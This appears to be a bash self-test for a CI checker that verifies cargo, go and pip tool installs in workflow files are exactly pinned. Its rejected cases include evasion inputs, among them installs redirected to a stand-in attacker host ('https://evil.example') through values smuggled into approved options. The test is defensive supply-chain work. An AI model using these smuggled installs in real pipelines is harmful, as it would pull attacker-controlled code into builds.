#!/usr/bin/env bash
set -euo pipefail

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
checker="$repo_root/.github/scripts/check-ci-tools-pinned.sh"
test_root="$(mktemp -d "${TMPDIR:-/tmp}/ci-tools-pinned.XXXXXX")"
trap 'rm -rf -- "$test_root"' EXIT

assert_accepted() {
  local scenario="$1"
  local command="$2"
  printf 'jobs:\n  check:\n    steps:\n      - run: %s\n' "$command" \
    >"$test_root/workflow.yml"
  if ! bash "$checker" "$test_root" >/dev/null 2>&1; then
    printf '%s was rejected\n' "$scenario" >&2
    exit 1
  fi
}

assert_rejected() {
  local scenario="$1"
  local command="$2"
  printf 'jobs:\n  check:\n    steps:\n      - run: %s\n' "$command" \
    >"$test_root/workflow.yml"
  if bash "$checker" "$test_root" >/dev/null 2>&1; then
    printf '%s was not rejected\n' "$scenario" >&2
    exit 1
  fi
}

assert_workflow_rejected() {
  local scenario="$1"
  local workflow="$2"
  printf '%s' "$workflow" >"$test_root/workflow.yml"
  if bash "$checker" "$test_root" >/dev/null 2>&1; then
    printf '%s was not rejected\n' "$scenario" >&2
    exit 1
  fi
}

assert_accepted \
  "exact Cargo tool version" \
  "cargo install --locked --version 1.2.3 cargo-example"
assert_accepted \
  "exact Cargo tool version with equals syntax" \
  "cargo install --version=1.2.3 --locked cargo-example"
assert_accepted \
  "exact Go module version" \
  "go install example.com/tools/check@v1.2.3"
assert_accepted \
  "exact Go prerelease version" \
  "go install example.com/tools/check@v1.2.3-rc.1"
assert_accepted \
  "Cargo install text in a YAML comment" \
  "echo ok # cargo install cargo-example"
assert_accepted \
  "Go install text in a YAML comment" \
  "echo ok # go install example.com/tools/check@latest"
assert_accepted \
  "installer text in a single-quoted shell literal" \
  "echo '\$(cargo install cargo-example)'"

assert_rejected \
  "mutable Cargo tool version hidden by a comment" \
  "cargo install cargo-example # --locked --version 1.2.3"
assert_rejected \
  "mutable Cargo tool after a quoted hash" \
  "echo '#' && cargo install cargo-example"
assert_rejected \
  "Cargo tool borrowing pins from a later command" \
  "cargo install cargo-example; echo --locked --version 1.2.3"
assert_rejected \
  "Cargo install with a split command name" \
  $'|\n          cargo \\\n            install --locked --version 1.2.3 cargo-example'
assert_rejected \
  "Cargo install split across a folded YAML scalar" \
  $'>-\n          cargo\n          install cargo-example'
assert_workflow_rejected \
  "mutable Cargo install behind a quoted run key" \
  $'jobs:\n  check:\n    steps:\n      - "run": cargo install cargo-example\n'
assert_rejected \
  "Cargo install nested in command substitution" \
  'echo "$(cargo install cargo-example)"'
assert_rejected \
  "pinned Cargo install nested in command substitution" \
  'result=$(cargo install --locked --version 1.2.3 cargo-example)'
assert_rejected \
  "Cargo install nested in legacy backticks" \
  'echo `cargo install cargo-example`'
assert_rejected \
  "Cargo tool with a non-semantic version suffix" \
  "cargo install --locked --version 1.2.3mutable cargo-example"
assert_rejected \
  "Cargo tool with an embedded hash version suffix" \
  "cargo install --locked --version 1.2.3#mutable cargo-example"
assert_rejected \
  "Cargo install with multiple packages" \
  "cargo install --locked --version 1.2.3 cargo-one cargo-two"
assert_rejected \
  "Cargo install with a duplicate version" \
  "cargo install --locked --version 1.2.3 --version 1.2.3 cargo-example"
assert_rejected \
  "Cargo install with duplicate locked flags" \
  "cargo install --locked --locked --version 1.2.3 cargo-example"
assert_rejected \
  "Cargo install from a Git source" \
  "cargo install --locked --version 1.2.3 --git https://example.invalid/tool cargo-example"
assert_rejected \
  "Cargo install from an alternate registry" \
  "cargo install --locked --version 1.2.3 --registry alternate cargo-example"
assert_rejected \
  "Cargo install with an undeclared option" \
  "cargo install --locked --version 1.2.3 --force cargo-example"
assert_rejected \
  "mutable Go module version" \
  "go install example.com/tools/check@latest"
assert_rejected \
  "mutable Go module after a quoted hash" \
  "echo \"#\" && go install example.com/tools/check@latest"
assert_rejected \
  "mutable Go module version hidden by a comment" \
  "go install example.com/tools/check@latest # example.com/other@v1.2.3"
assert_rejected \
  "ambiguous multi-module Go install" \
  "go install example.com/one@v1.2.3 example.com/two@v1.2.3"
assert_rejected \
  "Go module supplied through an environment expansion" \
  'go install "$GO_TOOL_MODULE@v1.2.3"'
assert_rejected \
  "Go module supplied through command substitution" \
  'go install "$(tool-module)@v1.2.3"'
assert_rejected \
  "non-canonical Go module path" \
  "go install example.com//tools/check@v1.2.3"
assert_rejected \
  "Go module with an embedded hash version suffix" \
  "go install example.com/tools/check@v1.2.3#mutable"
assert_rejected \
  "Go install with a split command name" \
  $'|\n          go \\\n            install example.com/tools/check@v1.2.3'
assert_rejected \
  "Go install split across a folded YAML scalar" \
  $'>-\n          go\n          install example.com/tools/check@latest'

assert_accepted \
  "exact pip requirement version" \
  "pip install --user semgrep==1.160.0"
assert_accepted \
  "exact pip prerelease version" \
  "pip3 install semgrep==1.160.0rc1"
assert_accepted \
  "exact pip requirement with hardening flags" \
  "pip install --user --no-cache-dir --disable-pip-version-check semgrep==1.160.0"
assert_accepted \
  "pip install text in a YAML comment" \
  "echo ok # pip install semgrep"
assert_accepted \
  "pip install restricted to prebuilt wheels" \
  "pip install --user --only-binary=:all: semgrep==1.160.0"
assert_accepted \
  "pip install restricted to prebuilt wheels with separated value" \
  "pip install --user --only-binary :all: semgrep==1.160.0"

assert_rejected \
  "unpinned pip requirement" \
  "pip install --user semgrep"
assert_rejected \
  "range-pinned pip requirement" \
  "pip install --user 'semgrep>=1.160.0'"
assert_rejected \
  "pip requirement with an embedded hash version suffix" \
  "pip install --user semgrep==1.160.0#mutable"
assert_rejected \
  "compatible-release pip requirement" \
  "pip install --user 'semgrep~=1.160.0'"
assert_rejected \
  "pip install with multiple requirements" \
  "pip install --user semgrep==1.160.0 ruff==0.1.0"
assert_rejected \
  "pip install from an alternate index" \
  "pip install --user --index-url https://example.invalid/simple semgrep==1.160.0"
assert_rejected \
  "pip install from an extra index" \
  "pip install --user --extra-index-url https://example.invalid/simple semgrep==1.160.0"
assert_rejected \
  "pip install from a requirements file" \
  "pip install --user -r requirements.txt"
assert_rejected \
  "editable pip install" \
  "pip install --user -e ."
assert_rejected \
  "pip install from a direct URL" \
  "pip install --user https://example.invalid/semgrep-1.160.0.tar.gz"
assert_rejected \
  "pip install with an undeclared option" \
  "pip install --user --upgrade semgrep==1.160.0"
assert_rejected \
  "pip install hiding an index redirect as an approved option's value" \
  "pip install --user --only-binary --index-url=https://evil.example semgrep==1.160.0"
assert_rejected \
  "cargo install hiding a git source as the version value" \
  "cargo install --locked --version --git=https://evil.example some-crate"
assert_rejected \
  "pip install allowing prereleases" \
  "pip install --user --pre semgrep==1.160.0"
assert_rejected \
  "pip install with the default index disabled" \
  "pip install --user --no-index semgrep==1.160.0"
assert_rejected \
  "pip install borrowing a pin from a later command" \
  "pip install --user semgrep; echo semgrep==1.160.0"
assert_rejected \
  "unpinned pip requirement hidden by a comment" \
  "pip install --user semgrep # ==1.160.0"
assert_rejected \
  "pip install with a split command name" \
  $'|\n          pip \\\n            install --user semgrep==1.160.0'
assert_rejected \
  "pip install split across a folded YAML scalar" \
  $'>-\n          pip\n          install --user semgrep'

empty_root="$test_root/empty"
mkdir -p "$empty_root"
if bash "$checker" "$empty_root" >/dev/null 2>&1; then
  printf 'empty configuration tree was not rejected\n' >&2
  exit 1
fi

printf 'CI tool pinning guard self-test passed.\n'
